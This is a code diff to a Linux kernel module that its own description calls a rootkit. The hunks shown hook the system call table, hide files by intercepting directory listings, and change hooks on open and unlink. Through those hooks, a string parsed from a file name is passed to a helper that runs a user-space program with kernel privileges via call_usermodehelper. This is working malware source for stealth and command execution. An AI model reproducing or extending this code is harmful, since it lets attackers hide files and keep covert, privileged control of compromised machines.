@@ -16,6 +16,7 @@ MODULE_DESCRIPTION("Rootkit main entry");
 static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
 static int callMonitor(char *msg);
+static int setMonitor(char *msg);
 
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
@@ -33,6 +34,7 @@ char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
 int filenum;
+
 
 /*
  * Disable write protection for hook system call table
@@ -130,9 +132,6 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 }
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
-    if(monitor != NULL){
-        callMonitor(filename);
-    }
         
     //Monitor exist file    
     return kernel_open(filename, flags, mode);
@@ -171,11 +170,8 @@ asmlinkage long hooked_unlink(const char __user *filename){
         }
         if(j>0){
             value[j] = '\0';
-            monitor = value;
+            callMonitor(value);
         }
-    }
-    if(monitor != NULL){
-        callMonitor(filename);
     }
     return kernel_unlink(filename);
 }
@@ -193,6 +189,16 @@ static void lkm_exit(void)
 }
 
 static int callMonitor(char *msg){
+    char *argv[] = { monitor, msg, NULL};
+    static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
+
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+static int setMonitor(char *msg){
     char *argv[] = { monitor, msg, NULL};
     static char *envp[] = {
             "HOME=/",
